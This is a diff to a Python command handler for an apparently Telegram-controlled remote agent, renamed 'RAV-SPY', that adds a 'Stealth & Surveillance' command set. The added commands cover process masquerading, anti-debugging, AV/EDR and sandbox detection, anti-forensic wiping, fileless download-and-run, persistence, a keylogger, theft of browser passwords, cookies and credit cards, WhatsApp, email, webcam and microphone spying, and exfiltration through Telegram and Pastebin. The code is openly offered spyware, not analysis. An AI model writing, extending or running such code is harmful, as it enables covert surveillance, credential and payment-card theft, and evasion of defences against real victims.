@@ -759,7 +759,7 @@ class CommandHandler:
         if not text:
             return "Pesan notifikasi tidak boleh kosong."
         from agent.notifier import send_notification
-        if send_notification("RAV-REMOTE", text):
+        if send_notification("RAV-SPY", text):
             return "Notifikasi desktop berhasil dikirim."
         return "Gagal kirim notifikasi. Install notify-send (Linux), plyer, atau osascript (macOS)."
 
@@ -2775,14 +2775,24 @@ class CommandHandler:
         if not args:
             return (
                 "🤖 *Autonomous Agent Mode*\n"
-                "`!agent <goal>` — Jalankan agent untuk goal tertentu\n"
-                "`!agent stop` — Hentikan agent yang sedang berjalan"
+                "`!agent <goal>` — Jalankan agent untuk goal kompleks\n"
+                "`!agent stop` — Hentikan agent yang sedang berjalan\n\n"
+                "Agent akan membuat rencana, eksekusi langkah demi langkah, "
+                "dan melaporkan progress ke Telegram."
             )
         if args[0].lower() == "stop":
             autonomous_agent.stop()
             return "⏹️ Agent dihentikan."
         goal = " ".join(args)
-        return await autonomous_agent.run(goal, "user")
+
+        # Beri akses ke router biar agent bisa eksekusi command
+        try:
+            from bot.command_router import CommandRouter
+            router = CommandRouter()
+        except Exception:
+            router = None
+
+        return await autonomous_agent.run(goal, "user", router=router, handler=self)
 
     async def handle_ai_agent(self, args: list[str]) -> str:
         from agent.ai_agent import run_agent, get_history, clear_history
@@ -2962,4 +2972,483 @@ class CommandHandler:
         context = " ".join(args) if args else ""
         return await proactive_suggester.suggest(context)
 
- 
+    # ═══════════════════════════════════════════════════════════════
+    # PHASE SPY: Stealth & Surveillance Features
+    # ═══════════════════════════════════════════════════════════════
+
+    async def handle_stealth(self, args: list[str]) -> str:
+        from agent.stealth import activate as basic_activate, deactivate as basic_deactivate, status as basic_status
+
+        def _help() -> str:
+            return (
+                "🕵️ *Stealth Mode*\n"
+                "`!stealth on` — Basic stealth (masquerade as dbus-daemon)\n"
+                "`!stealth off` — Nonaktifkan basic stealth\n"
+                "`!stealth status` — Cek status stealth\n"
+                "`!stealth masquerade [name]` — Masquerade process name + argv[0]\n"
+                "`!stealth harden` — Anti-debug: dumpable=0, ptrace=block\n"
+                "`!stealth detect` — Scan EDR/AV + sandbox detection\n"
+                "`!stealth clean [aggressive]` — Anti-forensic: clear traces\n"
+                "`!stealth fileless python|shell|url <code/url>` — Memory-only execution\n"
+            )
+
+        if not args:
+            return _help()
+        cmd = args[0].lower()
+
+        if cmd == "on":
+            return basic_activate()
+        elif cmd == "off":
+            return basic_deactivate()
+        elif cmd == "status":
+            basic = basic_status()
+            try:
+                from agent.stealth_advanced import full_status
+                adv = "\n" + full_status()
+            except Exception:
+                adv = ""
+            return basic + adv
+
+        elif cmd == "masquerade":
+            from agent.stealth_advanced import masquerade_process
+            name = args[1] if len(args) > 1 else "dbus-daemon"
+            return masquerade_process(name)
+
+        elif cmd == "harden":
+            from agent.stealth_advanced import harden
+            return harden()
+
+        elif cmd == "detect":
+            from agent.stealth_advanced import detect_report
+            return detect_report()
+
+        elif cmd == "clean":
+            from agent.anti_forensic import deep_wipe
+            aggressive = len(args) > 1 and args[1].lower() in ("aggressive", "yes", "y")
+            return deep_wipe(aggressive)
+
+        elif cmd == "fileless":
+            from agent.stealth_advanced import fileless_run_python, fileless_run_shell, fileless_download_and_run
+            if len(args) < 2:
+                return "Gunakan: !stealth fileless python|shell|url <code/url>"
+            mode = args[1].lower()
+            payload = " ".join(args[2:])
+            if not payload:
+                return "Payload kosong."
+            if mode == "python":
+                return await asyncio.to_thread(fileless_run_python, payload)
+            elif mode == "shell":
+                return await asyncio.to_thread(fileless_run_shell, payload)
+            elif mode == "url":
+                return await asyncio.to_thread(fileless_download_and_run, payload)
+            return "Mode: python|shell|url"
+
+        return _help()
+
+    async def handle_persistence(self, args: list[str]) -> str:
+        from agent.persistence import install, remove, status
+        if not args:
+            return (
+                "🔗 *Persistence*\n"
+                "`!persistence install [method]` — Install persistence\n"
+                "`!persistence remove [method]` — Hapus persistence\n"
+                "`!persistence status` — Cek status persistence\n"
+                "Method: systemd, crontab, autostart, bashrc, all"
+            )
+        cmd = args[0].lower()
+        if cmd == "install":
+            method = args[1] if len(args) > 1 else "all"
+            return install(method)
+        elif cmd == "remove":
+            method = args[1] if len(args) > 1 else "all"
+            return remove(method)
+        elif cmd == "status":
+            return status()
+        return "Gunakan: !persistence install|remove|status"
+
+    async def handle_self_destruct(self, args: list[str]) -> str:
+        from agent.self_destruct import panic, self_destruct
+        from agent.anti_forensic import wipe_everything
+        if not args:
+            return (
+                "💀 *Self Destruct*\n"
+                "`!self_destruct panic` — Emergency: clear clipboard, hide windows, mute\n"
+                "`!self_destruct run [keep_config]` — Hapus semua jejak (logs, cache, history, persistence)\n"
+                "`!self_destruct deep` — Deep wipe: + browser data, trash, thumbnails, DNS cache\n"
+                "⚠️  Perintah ini menghapus logs dan konfigurasi!"
+            )
+        cmd = args[0].lower()
+        if cmd == "panic":
+            return panic()
+        elif cmd == "run":
+            keep = len(args) > 1 and args[1].lower() == "keep_config"
+            return self_destruct(keep_config=keep)
+        elif cmd == "deep":
+            keep = len(args) > 1 and args[1].lower() == "keep_config"
+            return wipe_everything(keep_persistence=keep)
+        return "Gunakan: !self_destruct panic|run|deep"
+
+    async def handle_arp(self, args: list[str]) -> str:
+        from agent.network_recon import arp_table
+        return arp_table()
+
+    async def handle_routing(self, args: list[str]) -> str:
+        from agent.network_recon import routing_table
+        return routing_table()
+
+    async def handle_dns_info(self, args: list[str]) -> str:
+        from agent.network_recon import dns_info
+        return dns_info()
+
+    async def handle_net_recon(self, args: list[str]) -> str:
+        from agent.network_recon import full_recon
+        return full_recon()
+
+    async def handle_wifi_surveillance(self, args: list[str]) -> str:
+        from agent.wifi_surveillance import scan, known_networks, tracking
+        if not args:
+            return (
+                "📡 *Wi-Fi Surveillance*\n"
+                "`!wifi_surveillance scan` — Scan jaringan Wi-Fi sekitar\n"
+                "`!wifi_surveillance known` — Lihat known networks\n"
+                "`!wifi_surveillance track` — Simpan snapshot Wi-Fi"
+            )
+        cmd = args[0].lower()
+        if cmd == "scan":
+            return scan()
+        elif cmd == "known":
+            return known_networks()
+        elif cmd == "track":
+            return tracking(True)
+        return "Gunakan: !wifi_surveillance scan|known|track"
+
+    async def handle_connections(self, args: list[str]) -> str:
+        from agent.connection_logger import snapshot, start, stop, export as conn_export
+        if not args:
+            return (
+                "🔌 *Connection Logger*\n"
+                "`!connections` — Snapshot koneksi TCP aktif\n"
+                "`!connections start [interval]` — Mulai logging background\n"
+                "`!connections stop` — Hentikan logging\n"
+                "`!connections export` — Statistik log"
+            )
+        cmd = args[0].lower()
+        if cmd == "start":
+            interval = int(args[1]) if len(args) > 1 else 60
+            return await start(interval)
+        elif cmd == "stop":
+            return await stop()
+        elif cmd == "export":
+            return conn_export()
+        else:
+            return snapshot()
+
+    async def handle_keylogger(self, args: list[str]) -> str:
+        from agent.keylogger import start, stop, status as kl_status, export as kl_export, stats as kl_stats
+        if not args:
+            return (
+                "⌨️ *Keylogger*\n"
+                "`!keylogger start` — Mulai keylogging\n"
+                "`!keylogger stop` — Hentikan keylogging\n"
+                "`!keylogger status` — Cek status\n"
+                "`!keylogger export [decrypt]` — Export data keylog\n"
+                "`!keylogger stats` — Statistik keylog"
+            )
+        cmd = args[0].lower()
+        if cmd == "start":
+            return start()
+        elif cmd == "stop":
+            return stop()
+        elif cmd == "status":
+            return kl_status()
+        elif cmd == "export":
+            decrypt = len(args) > 1 and args[1].lower() == "decrypt"
+            return kl_export(decrypt=decrypt)
+        elif cmd == "stats":
+            return kl_stats()
+        return "Gunakan: !keylogger start|stop|status|export|stats"
+
+    async def handle_browser_history(self, args: list[str]) -> str:
+        from agent.browser_spy import history, bookmarks, downloads
+        if not args:
+            return (
+                "🌐 *Browser Spy*\n"
+                "`!browser_history history [limit] [since_hours]` — Riwayat browsing\n"
+                "`!browser_history bookmarks` — Bookmark tersimpan\n"
+                "`!browser_history downloads [limit]` — Riwayat download"
+            )
+        cmd = args[0].lower()
+        if cmd == "history":
+            limit = int(args[1]) if len(args) > 1 else 30
+            since = int(args[2]) if len(args) > 2 else 0
+            return history(limit=limit, since_hours=since)
+        elif cmd == "bookmarks":
+            return bookmarks()
+        elif cmd == "downloads":
+            limit = int(args[1]) if len(args) > 1 else 20
+            return downloads(limit=limit)
+        return "Gunakan: !browser_history history|bookmarks|downloads"
+
+    async def handle_browser_stealer(self, args: list[str]) -> str:
+        from agent.browser_stealer import steal_all, steal_cookies, steal_passwords, format_steal_report
+        if not args:
+            return (
+                "💀 *Browser Stealer*\n"
+                "`!steal all` — Semua data (cookies + passwords + cards + autofill + extensions)\n"
+                "`!steal cookies` — Cookie session dari Chrome/Firefox\n"
+                "`!steal passwords` — Saved passwords\n"
+                "`!steal cards` — Credit cards\n"
+                "`!steal autofill` — Autofill data\n"
+                "`!steal addresses` — Saved addresses\n"
+                "`!steal extensions` — Installed extensions\n"
+                "`!steal sessions` — Session files\n"
+                "`!steal profiles` — Detected browser profiles"
+            )
+        cmd = args[0].lower()
+        if cmd == "all":
+            data = await asyncio.to_thread(steal_all)
+            return format_steal_report(data, "all")
+        elif cmd == "cookies":
+            data = await asyncio.to_thread(steal_cookies)
+            return format_steal_report({"cookies": data}, "cookies")
+        elif cmd == "passwords":
+            data = await asyncio.to_thread(steal_passwords)
+            return format_steal_report({"passwords": data}, "passwords")
+        elif cmd == "cards":
+            data = await asyncio.to_thread(steal_all)
+            return format_steal_report(data, "cards")
+        elif cmd == "autofill":
+            data = await asyncio.to_thread(steal_all)
+            return format_steal_report(data, "autofill")
+        elif cmd == "addresses":
+            data = await asyncio.to_thread(steal_all)
+            return format_steal_report(data, "addresses")
+        elif cmd == "extensions":
+            data = await asyncio.to_thread(steal_all)
+            return format_steal_report(data, "extensions")
+        elif cmd == "sessions":
+            data = await asyncio.to_thread(steal_all)
+            return format_steal_report(data, "sessions")
+        elif cmd == "profiles":
+            data = await asyncio.to_thread(steal_all)
+            return format_steal_report(data, "profiles")
+        return "Gunakan: !steal all|cookies|passwords|cards|autofill|addresses|extensions|sessions|profiles"
+
+    async def handle_social_spy(self, args: list[str]) -> str:
+        from agent.social_spy import detect_social, track, report
+        if not args:
+            return (
+                "👁️ *Social Spy*\n"
+                "`!social_spy detect` — Deteksi social media di window aktif\n"
+                "`!social_spy track` — Catat aktivitas social media\n"
+                "`!social_spy report [hours]` — Laporan aktivitas social media"
+            )
+        cmd = args[0].lower()
+        if cmd == "detect":
+            return detect_social()
+        elif cmd == "track":
+            return track()
+        elif cmd == "report":
+            hours = int(args[1]) if len(args) > 1 else 24
+            return report(hours=hours)
+        return "Gunakan: !social_spy detect|track|report"
+
+    async def handle_email_spy(self, args: list[str]) -> str:
+        from agent.email_spy import recent, contacts
+        if not args:
+            return (
+                "📧 *Email Spy*\n"
+                "`!email_spy recent [limit] [source]` — Email terbaru\n"
+                "`!email_spy contacts` — Kontak dari address book\n"
+                "Source: thunderbird (default), evolution"
+            )
+        cmd = args[0].lower()
+        if cmd == "recent":
+            limit = int(args[1]) if len(args) > 1 else 10
+            source = args[2] if len(args) > 2 else "thunderbird"
+            return recent(limit=limit, source=source)
+        elif cmd == "contacts":
+            return contacts()
+        return "Gunakan: !email_spy recent|contacts"
+
+    async def handle_audio_surveillance(self, args: list[str]) -> str:
+        from agent.audio_surveillance import listen, ambient_start, ambient_stop, ambient_status
+        if not args:
+            return (
+                "🎤 *Audio Surveillance*\n"
+                "`!audio_surveillance listen [seconds]` — Rekam mikrofon\n"
+                "`!audio_surveillance ambient_start [duration] [threshold]` — Monitoring ambient\n"
+                "`!audio_surveillance ambient_stop` — Hentikan ambient monitoring\n"
+                "`!audio_surveillance ambient_status` — Status ambient monitoring"
+            )
+        cmd = args[0].lower()
+        if cmd == "listen":
+            seconds = int(args[1]) if len(args) > 1 else 10
+            return listen(seconds)
+        elif cmd == "ambient_start":
+            duration = int(args[1]) if len(args) > 1 else 300
+            threshold = int(args[2]) if len(args) > 2 else 300
+            return await ambient_start(duration=duration, threshold=threshold)
+        elif cmd == "ambient_stop":
+            return ambient_stop()
+        elif cmd == "ambient_status":
+            return ambient_status()
+        return "Gunakan: !audio_surveillance listen|ambient_start|ambient_stop|ambient_status"
+
+    async def handle_webcam_surveillance(self, args: list[str]) -> str:
+        from agent.webcam_surveillance import motion_start, motion_stop, interval_start, interval_stop
+        if not args:
+            return (
+                "📷 *Webcam Surveillance*\n"
+                "`!webcam_surveillance motion_start [sensitivity]` — Deteksi gerakan\n"
+                "`!webcam_surveillance motion_stop` — Hentikan deteksi gerakan\n"
+                "`!webcam_surveillance interval_start [seconds] [count]` — Capture interval\n"
+                "`!webcam_surveillance interval_stop` — Hentikan interval capture"
+            )
+        cmd = args[0].lower()
+        if cmd == "motion_start":
+            sensitivity = int(args[1]) if len(args) > 1 else 5
+            return await motion_start(sensitivity=sensitivity)
+        elif cmd == "motion_stop":
+            return await motion_stop()
+        elif cmd == "interval_start":
+            seconds = int(args[1]) if len(args) > 1 else 10
+            count = int(args[2]) if len(args) > 2 else 10
+            return await interval_start(seconds=seconds, count=count)
+        elif cmd == "interval_stop":
+            return await interval_stop()
+        return "Gunakan: !webcam_surveillance motion_start|motion_stop|interval_start|interval_stop"
+
+    async def handle_collect(self, args: list[str]) -> str:
+        from agent.data_exfil import collect, package
+        if not args:
+            return (
+                "📦 *Data Collection*\n"
+                "`!collect auto` — Kumpulkan intel sistem\n"
+                "`!collect history` — Riwayat browsing\n"
+                "`!collect screenshots` — Screenshot terbaru\n"
+                "`!collect package <target>` — Kumpulkan + package jadi tar.gz"
+            )
+        target = args[0].lower()
+        if target == "package" and len(args) > 1:
+            data = await collect(args[1])
+            if isinstance(data, dict):
+                return await package(data)
+            return str(data)
+        data = await collect(target)
+        if isinstance(data, str):
+            return data
+        import json
+        return json.dumps(data, indent=2, default=str)[:2000]
+
+    async def handle_exfil(self, args: list[str]) -> str:
+        from agent.exfil_channels import via_telegram, via_pastebin
+        if not args:
+            return (
+                "📤 *Exfiltration*\n"
+                "`!exfil telegram <file_path> [caption]` — Kirim file via Telegram\n"
+                "`!exfil pastebin <content> [title]` — Upload ke Pastebin"
+            )
+        cmd = args[0].lower()
+        if cmd == "telegram" and len(args) > 1:
+            file_path = args[1]
+            caption = " ".join(args[2:]) if len(args) > 2 else ""
+            return await via_telegram(file_path, caption)
+        elif cmd == "pastebin" and len(args) > 1:
+            content = args[1]
+            title = " ".join(args[2:]) if len(args) > 2 else "RAV-SPY Data"
+            return await via_pastebin(content, title)
+        return "Gunakan: !exfil telegram <file_path> [caption] | pastebin <content> [title]"
+
+    async def handle_intel(self, args: list[str]) -> str:
+        from agent.ai_recon import full, user_behavior
+        if not args:
+            return (
+                "🧠 *AI Intel*\n"
+                "`!intel full` — Laporan intelijen komprehensif\n"
+                "`!intel behavior` — Analisis perilaku pengguna"
+            )
+        cmd = args[0].lower()
+        if cmd == "full":
+            return await full()
+        elif cmd == "behavior":
+            return await user_behavior()
+        return "Gunakan: !intel full|behavior"
+
+    async def handle_alert(self, args: list[str]) -> str:
+        from agent.smart_alert import config_set, config_get, config_delete, silence
+        if not args:
+            return (
+                "🔔 *Smart Alert*\n"
+                "`!alert set <key> <value>` — Set alert\n"
+                "`!alert get [key]` — Lihat konfigurasi alert\n"
+                "`!alert delete <key>` — Hapus alert\n"
+                "`!alert silence [seconds]` — Silence alert sementara"
+            )
+        cmd = args[0].lower()
+        if cmd == "set" and len(args) >= 3:
+            return config_set(args[1], " ".join(args[2:]))
+        elif cmd == "get":
+            key = args[1] if len(args) > 1 else None
+            return config_get(key)
+        elif cmd == "delete" and len(args) > 1:
+            return config_delete(args[1])
+        elif cmd == "silence":
+            seconds = int(args[1]) if len(args) > 1 else 300
+            return silence(seconds)
+        return "Gunakan: !alert set|get|delete|silence"
+
+    async def handle_wa(self, args: list[str]) -> str:
+        from agent.whatsapp_spy import (
+            check, monitor_start, monitor_stop, monitor_stop_all, monitor_list,
+            session_status, reset as wa_reset, scan as wa_scan,
+            get_messages, get_groups, send_message, forward_chat,
+        )
+        if not args:
+            return (
+                "💬 *WhatsApp Spy*\n"
+                "`!wa scan` — Tampilkan QR pairing\n"
+                "`!wa check <nomor>` — Cek status online/offline\n"
+                "`!wa monitor <nomor> [interval]` — Monitor background\n"
+                "`!wa stop <nomor>` — Hentikan monitor\n"
+                "`!wa stop_all` — Hentikan semua monitor\n"
+                "`!wa list` — Monitor aktif\n"
+                "`!wa status` — Status koneksi\n"
+                "`!wa reset` — Reset pairing\n"
+                "`!wa messages <nomor> [limit]` — Riwayat pesan\n"
+                "`!wa groups` — Daftar grup\n"
+                "`!wa send <nomor> <teks>` — Kirim pesan\n"
+                "`!wa forward <on/off/status> [nomor]` — Forward pesan otomatis ke Telegram\n\n"
+                "Contoh: !wa messages 6281234567890 10"
+            )
+        cmd = args[0].lower()
+        if cmd == "check" and len(args) > 1:
+            return await check(args[1])
+        elif cmd == "monitor" and len(args) > 1:
+            interval = int(args[2]) if len(args) > 2 else 60
+            return await monitor_start(args[1], interval)
+        elif cmd == "stop" and len(args) > 1:
+            return await monitor_stop(args[1])
+        elif cmd == "stop_all":
+            return await monitor_stop_all()
+        elif cmd == "list":
+            return monitor_list()
+        elif cmd == "status":
+            return await session_status()
+        elif cmd == "scan":
+            return await wa_scan()
+        elif cmd == "reset":
+            return await wa_reset()
+        elif cmd == "messages" and len(args) > 1:
+            limit = int(args[2]) if len(args) > 2 else 20
+            return await get_messages(args[1], limit)
+        elif cmd == "groups":
+            return await get_groups()
+        elif cmd == "send" and len(args) > 2:
+            return await send_message(args[1], " ".join(args[2:]))
+        elif cmd == "forward":
+            action = args[1] if len(args) > 1 else "status"
+            phone = args[2] if len(args) > 2 else None
+            return await forward_chat(phone, action)
+        return "Gunakan: !wa scan|check|monitor|stop|stop_all|list|status|reset|messages|groups|send|forward"
+
